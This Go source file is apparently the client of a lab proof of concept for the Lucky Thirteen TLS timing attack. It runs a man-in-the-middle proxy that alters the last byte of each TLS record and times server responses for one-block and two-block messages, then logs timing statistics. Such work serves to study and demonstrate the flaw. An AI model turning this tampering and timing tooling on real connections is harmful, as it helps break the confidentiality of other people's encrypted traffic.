/** Lucky 13 Client **/
package main

import (
	"github.com/jakemask/lucky13/defaults"
	"github.com/jakemask/lucky13/proxy"
	"github.com/jakemask/lucky13/tlsparse"
	"github.com/montanaflynn/stats"
	"log"
	"runtime/debug"
	"time"
)

const (
	N = 500
)

func simpleMITM(record *tlsparse.Record) *tlsparse.Record {
	record.Message[len(record.Message)-1] += 1
	return record
	//return proxy.VerboseMITM(record)
}

func main() {

	//TODO disable GC: https://golang.org/pkg/runtime/debug/#SetGCPercent
	debug.SetGCPercent(-1)

	prox := proxy.Serve(proxy.Config{
		ProxyPort:  defaults.PROXY_PORT,
		ServerHost: defaults.SERVER_HOST,
		ServerPort: defaults.SERVER_PORT,
	})

	oneblock := test(N, prox, []byte("12345678901234567890"), simpleMITM)
	twoblock := test(N, prox, []byte("1234567890123456789012345678901234567890"), simpleMITM)

	print("\n")

	log.Printf("N is %v", N)

	print("\n")

	oneMean, _ := stats.Mean(oneblock)
	oneMedian, _ := stats.Median(oneblock)
	oneStddev, _ := stats.StandardDeviation(oneblock)
	log.Printf("One Block Mean: %v", time.Duration(int64(oneMean)))
	log.Printf("One Block Median: %v", time.Duration(int64(oneMedian)))
	log.Printf("One Block Stddev: %v", time.Duration(int64(oneStddev)))

	print("\n")

	twoMean, _ := stats.Mean(twoblock)
	twoMedian, _ := stats.Median(twoblock)
	twoStddev, _ := stats.StandardDeviation(twoblock)
	log.Printf("Two Block Mean: %v", time.Duration(int64(twoMean)))
	log.Printf("Two Block Median: %v", time.Duration(int64(twoMedian)))
	log.Printf("Two Block Stddev: %v", time.Duration(int64(twoStddev)))
}

func test(n int, prox *proxy.Proxy, msg []byte, mitm proxy.MITM) []float64 {
	results := make([]float64, n)
	for i := 0; i < n; i++ {
		results[i] = float64(prox.Send(msg, mitm))
	}
	return results
}
